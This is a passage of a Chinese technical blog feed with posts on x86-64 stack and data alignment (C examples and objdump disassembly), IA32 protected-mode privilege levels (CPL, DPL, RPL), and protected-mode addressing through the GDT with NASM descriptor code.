align="center">long,double,char*</td></tr></tbody></table><p>无论数据是否对齐，x86_64硬件都能正常工作，但是却会降低系统的性能，所以我们的编译器在编译时一般会为我们实施数据对齐。</p><h2 id="栈的字节对齐"><a href="#栈的字节对齐" class="headerlink" title="栈的字节对齐"></a>栈的字节对齐</h2><p>栈的字节对齐，实际是指栈顶指针必须须是16字节的整数倍。栈对齐帮助在尽可能少的内存访问周期内读取数据，不对齐堆栈指针可能导致严重的性能下降。</p><p>上文我们说，即使数据没有对齐，我们的程序也是可以执行的，只是效率有点低而已，但是某些型号的Intel和AMD处理器对于有些实现多媒体操作的SSE指令，如果数据没有对齐的话，就无法正确执行。这些指令对16字节内存进行操作，在SSE单元和内存之间传送数据的指令要求内存地址必须是16的倍数。</p><p>因此，任何针对x86_64处理器的编译器和运行时系统都必须保证分配用来保存可能会被SSE寄存器读或写的数据结构的内存，都必须是16字节对齐的，这就形成了一种标准：</p><ul><li>任何内存分配函数（alloca, malloc, calloc或realloc）生成的块起始地址都必须是16的倍数。</li><li>大多数函数的栈帧的边界都必须是16直接的倍数。</li></ul><p>如上，在运行时栈中，不仅传递的参数和局部变量要满足字节对齐，我们的栈指针（%rsp）也必须是16的倍数。</p><h2 id="三个示例"><a href="#三个示例" class="headerlink" title="三个示例"></a>三个示例</h2><p>我们用三个实际的例子来看一看为了实现数据对齐和栈字节对齐，栈空间的分配具体是怎样的。</p><p>如下是CSAPP上的一个示例程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">proc</span><span class="params">(<span class="keyword">long</span>  a1, <span class="keyword">long</span>  *a1p,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">int</span>   a2, <span class="keyword">int</span>   *a2p,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">short</span> a3, <span class="keyword">short</span> *a3p,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">char</span>  a4, <span class="keyword">char</span>  *a4p)</span> </span>&#123;</span><br><span class="line">    *a1p += a1;</span><br><span class="line">    *a2p += a2;</span><br><span class="line">    *a3p += a3;</span><br><span class="line">    *a4p += a4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">call_proc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span>  x1 = <span class="number">1</span>; <span class="keyword">int</span>  x2 = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">short</span> x3 = <span class="number">3</span>; <span class="keyword">char</span> x4 = <span class="number">4</span>;</span><br><span class="line">    proc(x1, &amp;x1, x2, &amp;x2, x3, &amp;x3, x4, x4);</span><br><span class="line">    <span class="keyword">return</span> (x1+x2)*(x3+x4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用如下命令进行编译和反编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -Og -fno-stack-protector -c call_proc.c</span><br><span class="line">$ objdump -d call_proc.o</span><br></pre></td></tr></table></figure><p>其中<code>-fno-stack-protector</code>参数指示编译器不添加栈保护者机制</p><p>生成的汇编代码如下，这里我们仅看<code>call_proc()</code>中的栈空间分配</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0000000000000015 &lt;call_proc&gt;:</span><br><span class="line">  15:   48 83 ec 10             sub    $0x10,%rsp</span><br><span class="line">  19:   48 c7 44 24 08 01 00    movq   $0x1,0x8(%rsp)</span><br><span class="line">  20:   00 00 </span><br><span class="line">  22:   c7 44 24 04 02 00 00    movl   $0x2,0x4(%rsp)</span><br><span class="line">  29:   00 </span><br><span class="line">  2a:   66 c7 44 24 02 03 00    movw   $0x3,0x2(%rsp)</span><br><span class="line">  31:   c6 44 24 01 04          movb   $0x4,0x1(%rsp)</span><br><span class="line">  36:   48 8d 4c 24 04          lea    0x4(%rsp),%rcx</span><br><span class="line">  3b:   48 8d 74 24 08          lea    0x8(%rsp),%rsi</span><br><span class="line">  40:   48 8d 44 24 01          lea    0x1(%rsp),%rax</span><br><span class="line">  45:   50                      push   %rax</span><br><span class="line">  46:   6a 04                   pushq  $0x4</span><br><span class="line">  48:   4c 8d 4c 24 12          lea    0x12(%rsp),%r9</span><br><span class="line">  4d:   41 b8 03 00 00 00       mov    $0x3,%r8d</span><br><span class="line">  53:   ba 02 00 00 00          mov    $0x2,%edx</span><br><span class="line">  58:   bf 01 00 00 00          mov    $0x1,%edi</span><br><span class="line">  5d:   e8 00 00 00 00          callq  62 &lt;call_proc+0x4d&gt;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>15行（我们具体以代码中给出的行号，其实这些数字应该是指令的起始位置，姑且就这样叫吧）中先将%rsp减去0x10，为4个局部变量共分配了16个字节的空间，并且在45和46行，程序将%rax和$0x4入栈，联系该函数的C语言程序和汇编程序中的具体操作，不难知，栈上的具体空间分配如下图所示：</p><img src="/images/运行时栈的字节对齐2.png"><p>图中，为了使栈字节对齐，4单独占用了一个8字节的空间，并且栈中的每一个类型的变量，都符合数据对齐的要求。</p><p>如果我们的参数8占用的字节数减少，会不会减少栈空间的占用呢？我们将上面的C语言程序的稍微改一改，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">proc</span><span class="params">(<span class="keyword">long</span>  a1, <span class="keyword">long</span>  *a1p,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">int</span>   a2, <span class="keyword">int</span>   *a2p,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">short</span> a3, <span class="keyword">short</span> *a3p,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">char</span>  a4, <span class="keyword">char</span> a5)</span> </span>&#123;  <span class="comment">// char *a4p改为了char a5</span></span><br><span class="line">    *a1p += a1;</span><br><span class="line">    *a2p += a2;</span><br><span class="line">    *a3p += a3;</span><br><span class="line">    a5 += a4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">call_proc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span>  x1 = <span class="number">1</span>; <span class="keyword">int</span>  x2 = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">short</span> x3 = <span class="number">3</span>; <span class="keyword">char</span> x4 = <span class="number">4</span>;</span><br><span class="line">    proc(x1, &amp;x1, x2, &amp;x2, x3, &amp;x3, x4, x4);  <span class="comment">// 相应的改变了最后一个参数</span></span><br><span class="line">    <span class="keyword">return</span> (x1+x2)*(x3+x4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>call_proc()</code>的汇编如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">000000000000000a &lt;call_proc&gt;:</span><br><span class="line">   a:   48 83 ec 10             sub    $0x10,%rsp</span><br><span class="line">   e:   48 c7 44 24 08 01 00    movq   $0x1,0x8(%rsp)</span><br><span class="line">  15:   00 00 </span><br><span class="line">  17:   c7 44 24 04 02 00 00    movl   $0x2,0x4(%rsp)</span><br><span class="line">  1e:   00 </span><br><span class="line">  1f:   66 c7 44 24 02 03 00    movw   $0x3,0x2(%rsp)</span><br><span class="line">  26:   48 8d 4c 24 04          lea    0x4(%rsp),%rcx</span><br><span class="line">  2b:   48 8d 74 24 08          lea    0x8(%rsp),%rsi</span><br><span class="line">  30:   6a 04                   pushq  $0x4</span><br><span class="line">  32:   6a 04                   pushq  $0x4</span><br><span class="line">  34:   4c 8d 4c 24 12          lea    0x12(%rsp),%r9</span><br><span class="line">  39:   41 b8 03 00 00 00       mov    $0x3,%r8d</span><br><span class="line">  3f:   ba 02 00 00 00          mov    $0x2,%edx</span><br><span class="line">  44:   bf 01 00 00 00          mov    $0x1,%edi</span><br><span class="line">  49:   e8 00 00 00 00          callq  4e &lt;call_proc+0x44&gt;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>对照程序，栈的空间结构编程的如下如所示：</p><img src="/images/运行时栈的字节对齐3.png"><p>我们发现，栈空间的占用并没有减少，为了能够达到栈字节对齐的目的，参数8和参数7各占一个8字节的空间，该过程调用浪费了1 + 7 + 7 = 15字节的空间。但为了兼容性和效率，这是值得的。</p><p>我们再看另一个程序，当我们在栈中分配字符串时又是怎样的呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">char</span> buffer1[<span class="number">5</span>];</span><br><span class="line">       <span class="keyword">char</span> buffer2[<span class="number">10</span>];</span><br><span class="line">       <span class="built_in">strcpy</span>(buffer2, buffer1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        function(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>使用<code>gcc -fno-stack-protector -o foo foo.c</code>和<code>objdump -d foo</code>进行编译和反编译后，<code>function()</code>的汇编代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">000000000000064a &lt;function&gt;:</span><br><span class="line"> 64a:55                   push   %rbp</span><br><span class="line"> 64b:48 89 e5             mov    %rsp,%rbp</span><br><span class="line"> 64e:48 83 ec 20          sub    $0x20,%rsp</span><br><span class="line"> 652:89 7d ec             mov    %edi,-0x14(%rbp)</span><br><span class="line"> 655:89 75 e8             mov    %esi,-0x18(%rbp)</span><br><span class="line"> 658:89 55 e4             mov    %edx,-0x1c(%rbp)</span><br><span class="line"> 65b:48 8d 55 fb          lea    -0x5(%rbp),%rdx</span><br><span class="line"> 65f:48 8d 45 f1          lea    -0xf(%rbp),%rax</span><br><span class="line"> 663:48 89 d6             mov    %rdx,%rsi</span><br><span class="line"> 666:48 89 c7             mov    %rax,%rdi</span><br><span class="line"> 669:e8 b2 fe ff ff       callq  520 &lt;strcpy@plt&gt;</span><br><span class="line"> 66e:90                   nop</span><br><span class="line"> 66f:c9                   leaveq </span><br><span class="line"> 670:c3                   retq</span><br></pre></td></tr></table></figure><p>该过程共在栈上分配了32个字节的空间，其中包括两个字符串的空间和三个函数的参数的空间，这里需要提一下的是，尽管再x64下，函数的前6个参数直接用寄存器进行传递，但是有时候程序需要用到参数的地址，这个时候程序就不的不在栈上为参数分配内存并将参数拷贝到内存上，来满足程序对参数地址的操作。</p><p>联系程序，该过程的栈结构如下：</p><img src="/images/运行时栈的字节对齐4.png"><p>图中，因为char类型的地址可以从任意地址开始（地址为1的倍数），所以buffer1和buffer2是连续分配的，而三个int型变量则分配在了两个单独的8字节空间中。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>以上，我们看到，为了满足数据对齐和栈字节对齐的要求，或者说规范，编译器不惜牺牲了部分内存，这使得程序提高了兼容性，也提高了程序的性能。</p><hr><p>完</p><p>参考：</p><ul><li>《深入理解计算机系统》</li><li><a href="https://www.twblogs.net/a/5b8047b92b71772165a6bdd2/zh-cn" target="_blank" rel="noopener">C函数调用过程解析(x86-64)</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;C语言的过程调用机制（即函数之间的调用）的一个关键特性（起始大多数编程语言也是如此）都是使用了栈数据结构提供的后进先出的内存管理原则。每一个
      
    
    </summary>
    
      <category term="汇编" scheme="https://mingliangliu.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
      <category term="汇编" scheme="https://mingliangliu.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>保护模式特权级概述</title>
    <link href="https://mingliangliu.com/posts/59ac4d82/"/>
    <id>https://mingliangliu.com/posts/59ac4d82/</id>
    <published>2019-08-10T07:04:53.000Z</published>
    <updated>2020-02-15T06:45:50.777Z</updated>
    
    <content type="html"><![CDATA[<p>在IA32的操作系统中，段被分为了4个特权级，分别为0-3级，有时候我们也叫做ring0-ring3，其中，数值越小特权级越高。如下图所示：</p><p><img src="/images/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%89%B9%E6%9D%83%E7%BA%A7%E6%A6%82%E8%BF%B01.jpg" alt></p><p>图中，核心代码和数据所在的段的特权级都比较高，一般在ring0，而用户程序所在的段的特权级较低，一般在ring3。当低特权级的任务试图在未被允许的情况下访问高特权级的段时，将会产生常规保护错误。</p><p>而处理器是如何区分所在段的特权级，进而对其进行保护的呢？这就不得不提到CPL、DPL和RPL三者了。但是在开始之前，我们需要先了解一下一致代码段和非一致代码段。</p><h2 id="一致代码段和非一致代码段"><a href="#一致代码段和非一致代码段" class="headerlink" title="一致代码段和非一致代码段"></a>一致代码段和非一致代码段</h2><p>在操作系统中，我们有些高特权级的代码是希望被低特权级的程序所访问的，比如一些库函数，于是我们将这些高特权级代码放在一个叫做一致代码段的段里。而有些高特权级的代码，我们并不想让低特权级的程序所访问，于是我们把他们放在一个叫做非一致代码段的段里。具体来说，当通过call或者jmp指令转移到其它段时（即访问其他段），当转移的目标是一个优先级更高的一致代码段时，我们是可以进行访问的，但是当前的特权级会被延续下去；当转移的目标是一个优先级更高的非一致代码段时，这时的访问会引起常规保护错误（除非使用调用门或任务门）。</p><p>总结来说：</p><ul><li><p>一致代码段：由系统（高特权级）共享给低特权级的程序的代码所在的段，主要有下面两点限制：</p><ol><li>高特权级程序不能访问低特权级的数据</li><li>低特权级的程序可以访问高特权级的代码，但是<strong>特权级不会改变</strong>，还是保持低特权级程序的特权级</li></ol></li><li><p>非一致代码段：为了避免被低特权级程序所访问而保护起来的代码段，主要有一点限制：</p><ol><li>只允许同级之间访问</li></ol></li><li><p>另外，数据段都是非一致的 </p></li></ul><p>所遵循的规则如下图所示：</p><p><img src="/images/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%89%B9%E6%9D%83%E7%BA%A7%E6%A6%82%E8%BF%B02.jpg" alt></p><h2 id="CPL"><a href="#CPL" class="headerlink" title="CPL"></a>CPL</h2><p>CPL全称Current Privilege Level，顾名思义，CPL代表的是当前执行的任务和程序的特权级。它存储在cs和ss的第0位和第1位上。<strong>一般情况下</strong>，CPL等于代码所在段的特权级，当程序转移到不同的代码段时，处理器将改变CPL的值。</p><p>但是当访问一致代码段时，并不会改变CPL，正如一致代码段中所说，一致代码段可以被低特权级的程序所访问，但是并不会改变特权级，所以也就不会改变CPL，这就是与上面加粗的“一般情况”相对的“非一般情况”。</p><h2 id="DPL"><a href="#DPL" class="headerlink" title="DPL"></a>DPL</h2><p>DPL全程为Descriptor Privilege Level，它代表段或者门的特权级。他被存储在段描述符或者门描述符属性中的DPL字段上。</p><p>当当前的代码段试图访问一个段或者门时，DPL将会和CPL以及段或者门选择子的RPL相比较，而对于段或者门类型的不同，比较规则也不同，具体如下：</p><ul><li>数据段：如果访问的是一个数据段，DPL代表访问此段的最低特权级，即只有CPL &lt;= DPL（数值上），才有权限访问。</li><li>非一致代码段（不使用调用门）：DPL代表访问此段的特权级。即只有DPL = RPL，才有权限访问。</li><li>调用门：DPL规定了当前执行的任务和程序可以访问此调用门的最低特权级，即要CPL &lt;= DPL</li><li>一致代码段和非一致代码段（使用调用门访问）：DPL规定了访问此段的最高特权级。即只有CPL &gt;= DPL，才有权限访问。</li><li>TSS：DPL规定了访问此TSS的最低特权级。</li></ul><p>总结一下就是：</p><ul><li>在 数据段、调用门、TSS中，DPL代表最低特权级，访问要求：CPL &lt;= DPL</li><li>在 不使用调用门访问的非一直代码段时，访问要求： CPL = DPL</li><li>在 一致代码段和使用调用门访问的非一致代码段中，DPL 代表最高特权级，访问要求：CPL &gt;= DPL</li></ul><h2 id="RPL"><a href="#RPL" class="headerlink" title="RPL"></a>RPL</h2><p>RPL全称是Requested Privilege Level。RPL保存在段选择子的第0位和第1位上。我们在上文说了当一个段访问另一个段时，CPL与DPL的比较规则，但是仅仅比较CPL和DPL是不够的，处理器还要通过检查RPL来确定能否访问另一个段。</p><p>操作系统往往用RPL来避免低特权级应用程序访问高特权级段内的数据，即便提出访问请求的段有足够的特权级，如果RPL不够也是不行的，当RPL的值比CPL大的时候，RPL将起决定性作用。也就是说，只有当CPL和RPL都小于要访问的数据段的DPL时，才有权限访问该数据段。关于为什么引入RPL的讨论还是比较复杂的，此处不再深入探讨。</p><hr><p>完</p><p>参考：</p><ul><li>《一个操作系统的实现》 于渊</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在IA32的操作系统中，段被分为了4个特权级，分别为0-3级，有时候我们也叫做ring0-ring3，其中，数值越小特权级越高。如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%8
      
    
    </summary>
    
      <category term="汇编" scheme="https://mingliangliu.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
      <category term="汇编" scheme="https://mingliangliu.com/tags/%E6%B1%87%E7%BC%96/"/>
    
      <category term="保护模式" scheme="https://mingliangliu.com/tags/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>保护模式下的寻址</title>
    <link href="https://mingliangliu.com/posts/45a7bc96/"/>
    <id>https://mingliangliu.com/posts/45a7bc96/</id>
    <published>2019-08-04T12:20:03.000Z</published>
    <updated>2020-02-15T06:45:50.774Z</updated>
    
    <content type="html"><![CDATA[<p>在汇编语言中，或者你有学习过诸如微机原理或计算机组成原理等课程的话，那么你很可能听说过实模式和保护模式的概念。他们到底是什么，有什么不同，又如何寻址？</p><p>在王爽的《汇编语言》最后，有关于Intel微处理器的三种工作模式的介绍。</p><p>继Intel 8086推出之后，Intel又推出了划时代的80386微处理器，它可以在实模式、保护模式和虚拟8086模式下工作，从那以后的微处理器都提供了这三种工作模式，直到现在。Intel系列微处理器的三种工作模式如下：</p><ul><li>实模式：工作模式相当于一个8086</li><li>保护模式：提供支持多任务环境的工作方式，建立保护机制</li><li>虚拟8086模式：可以从保护模式切换至其中的一种8086工作方式，这种方式的提供使用户可以方便的在保护模式下运行一个或多个8086程序</li></ul><p>当我们的系统开机时，cpu首先工作在实模式下完成一些工作，之后跳入保护模式，为我们的系统提供多任务环境的支持。而当我们需要在保护模式的系统上运行实模式下的程序时（比如学习汇编时所用的DOS系统），我们就需要在当前的保护模式下弄一个“假”的实模式，这就是虚拟8086模式。</p><h2 id="GDT和描述符"><a href="#GDT和描述符" class="headerlink" title="GDT和描述符"></a>GDT和描述符</h2><p>在实模式下（可以理解为工作在8086上时），我们的CPU是16位的，提供了16位的寄存器，16位数据总线，20位的地址总线，可寻址范围位1M。物理地址遵循下面的计算公式：</p><p>$$<br>物理地址 = 段地址 * 16 + 偏移地址<br>$$</p><p>其中的段地址和偏移地址都是16位的。</p><p>从80386开始，Intel家族的CPU进入了32位时代，这时候CPU有32位的地址总线，所以可寻址范围为4G。CPU同样拥有的是32位的寄存器，一个寄存器即可寻址4GB的空间。</p><p>在实模式下，我们采用<strong>段地址:偏移地址</strong>的寻址方式是因为我们只有16为的寄存器，单个寄存器的寻址范围达不到1MB，但现在我们拥有了32位的寄存器，单个寄存器的可寻址范围已经可以达到4GB了，那么是不是就不需要段寄存器了？答案是否定的。在保护模式下，地址仍然采用“段地址:偏移地址”的方式来表示，只是<strong>段的概念发生了根本性的变化</strong>。</p><p>实模式下，段值（段地址的值）还是地址的一部分。在保护模式下，虽然段值仍然由原来的<strong>16位</strong>的cs、ds等寄存器表示，但是此时它们仅仅是一个索引，这些个索引<strong>指向一个数据结构的表项</strong>，表项中详细定义了一个段的起始地址、界限、属性等内容，这个数据结构，叫做<strong>GDT</strong>（其实还可能是LDT，我们先讨论大多数情况），GDT中的每一个表项，叫做<strong>描述符</strong></p><h2 id="寻址过程"><a href="#寻址过程" class="headerlink" title="寻址过程"></a>寻址过程</h2><p>我们在来看一下保护模式下的寻址过程。在此之前，有几点要说明：</p><ul><li>GDT是一个数据结构，它是保存在内存中的，所以它应该有一个起始地址，它是一系列描述符的集合</li><li>GDT的起始地址由一个专门的寄存器来存放 – gdtr，gdtr寄存器是48位的，这个寄存器我们稍后在探讨</li><li>GDT中的每一个描述符描述一个段，其中包括段的起始地址（基址）等属性</li><li>保护模式的偏移地址和实模式下的是相同的，只不过是32位</li></ul><p>好了，下面有一张图，我们可以看着这张图过一遍保护模式下是如何寻址的。</p><img src="/images/保护模式的寻址1.jpg"><ol><li>寻址时，先找到gdtr寄存器，从中得到GDT的基址</li><li>有了GDT的基址，又有段寄存器中保存的索引，可以得到段寄存器“所指”的那个表项，既所指的那个描述符</li><li>得到了描述符，就可以从描述符中得到该描述符所描述的那个段的起始地址</li><li>有了段的起始地址，将偏移地址拿过来与之相加，便能得到最后的<strong>线性地址</strong></li><li>有了线性地址（虚拟地址），经过变换，即可得到相应的物理地址</li></ol><p>相信到这里，你已经对寻址过程有了个大概的了解，然后我们看看我们上面所未详细提及的东西</p><h2 id="gdtr寄存器"><a href="#gdtr寄存器" class="headerlink" title="gdtr寄存器"></a>gdtr寄存器</h2><p>gdtr是一个48位的寄存器，其中保存了GDT的基地址和界限（或者说GDT的长度），高32位为GDT的基地址，低16位为界限。还记得保护模式中的段寄存器也是16位的吗，它们和gdtr中的界限是对应的啊。</p><img src="/images/保护模式下的寻址4.jpg" title="title gdtr寄存器"><h2 id="描述符"><a href="#描述符" class="headerlink" title="描述符"></a>描述符</h2><p>GDT中的每个描述符占8个字节，其结构如下</p><img src="/images/保护模式下的寻址2.jpg"><p>我们可以不用管其中的属性，仅看段基址和段界限。是不是和上面的寻址联系上了呢。</p><p>你可能会问，问什么段基址和段界限都被分开了，却不放在一起？这主要还是历史遗留问题，我们就不在探讨了。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>光看理论终究还是水中月，我们看一段简单的代码实际体会一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[SECTION .gdt]</span><br><span class="line">; GDT</span><br><span class="line">;                              段基址,       段界限     , 属性</span><br><span class="line">LABEL_GDT:   Descriptor       0,                0, 0           ; 空描述符</span><br><span class="line">LABEL_DESC_CODE32: Descriptor       0, SegCode32Len - 1, DA_C + DA_32; 非一致代码段</span><br><span class="line">LABEL_DESC_VIDEO:  Descriptor 0B8000h,           0ffffh, DA_DRW     ; 显存首地址</span><br><span class="line">; GDT 结束</span><br><span class="line"></span><br><span class="line">GdtLenequ$ - LABEL_GDT; GDT长度</span><br><span class="line">GdtPtrdwGdtLen - 1; GDT界限</span><br><span class="line">dd0; GDT基地址</span><br><span class="line"></span><br><span class="line">; GDT 选择子</span><br><span class="line">SelectorCode32equLABEL_DESC_CODE32- LABEL_GDT</span><br><span class="line">SelectorVideoequLABEL_DESC_VIDEO- LABEL_GDT</span><br></pre></td></tr></table></figure><p>上面的代码中，我们定义了一个角.gdt的段，其中前三个LABLE_xxx后是我们用一个叫Descriptor宏定义了三个选择子，其中的数值并不一定正确，因为我们只是定义了，还<strong>并没有初始化</strong>。 Descriptor的作用是将段基址、段界限和属性放在一个选择子中相应的位置，其定义在文章末尾，感兴趣的话可以看下。</p><p><code>GdtPtr</code>是不是和gdtr中所放的内容一样呢？没错，当我们在实模式进入保护模式之前，我们需要将GdtPtr的值加载到gdtr寄存器：使用指令<code>lgdt [GdtPtr]</code></p><p>那最后两个GDT选择子又是什么呢？好像是描述符相对于GDT基地址的偏移，其实并不全对，它稍稍复杂一些，如下图所示。</p><img src="/images/保护模式下的寻址3.jpg"><p>其中TI和RPL是选择子的一些属性，剩下的高13位表示的是描述符在描述符表的位置，即GDT中<strong>第几个</strong>描述符</p><p>最后，我们看一下如何使用上面的东西吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[SECTION .s32]; 32 位代码段. </span><br><span class="line">[BITS32]</span><br><span class="line"></span><br><span class="line">LABEL_SEG_CODE32:</span><br><span class="line">movax, SelectorVideo</span><br><span class="line">movgs, ax; 视频段选择子(目的)</span><br><span class="line"></span><br><span class="line">movedi, (80 * 11 + 79) * 2; 屏幕第 11 行, 第 79 列。</span><br><span class="line">movah, 0Ch; 0000: 黑底    1100: 红字</span><br><span class="line">moval, &apos;P&apos;</span><br><span class="line">mov[gs:edi], ax</span><br><span class="line"></span><br><span class="line">; 到此停止</span><br><span class="line">jmp$</span><br><span class="line"></span><br><span class="line">SegCode32Lenequ$ - LABEL_SEG_CODE32</span><br></pre></td></tr></table></figure><p>上述代码将一个字母P显示在屏幕上。gs中保存的是显存的选择子，edi为偏移地址，然后使用<code>mov    [gs:edi], ax</code>将ax的内容写入到地址为<strong>gs所指的描述符中的段基址+edi</strong>的内存处，由于这里写入的是显存，所以将会将一个字母P显示在屏幕上。</p><p>Descriptor宏的定义如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; usage: Descriptor Base, Limit, Attr</span><br><span class="line">;        Base:  dd</span><br><span class="line">;        Limit: dd (low 20 bits available)</span><br><span class="line">;        Attr:  dw (lower 4 bits of higher byte are always 0)</span><br><span class="line">%macro Descriptor 3</span><br><span class="line">dw%2 &amp; 0FFFFh; 段界限1</span><br><span class="line">dw%1 &amp; 0FFFFh; 段基址1</span><br><span class="line">db(%1 &gt;&gt; 16) &amp; 0FFh; 段基址2</span><br><span class="line">dw((%2 &gt;&gt; 8) &amp; 0F00h) | (%3 &amp; 0F0FFh); 属性1 + 段界限2 + 属性2</span><br><span class="line">db(%1 &gt;&gt; 24) &amp; 0FFh; 段基址3</span><br><span class="line">%endmacro ; 共 8 字节</span><br></pre></td></tr></table></figure><hr><p>完</p><p>参考：</p><ul><li>《汇编语言》 王爽</li><li>《一个操作系统的实现》 于渊</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在汇编语言中，或者你有学习过诸如微机原理或计算机组成原理等课程的话，那么你很可能听说过实模式和保护模式的概念。他们到底是什么，有什么不同，又如何寻址？&lt;/p&gt;
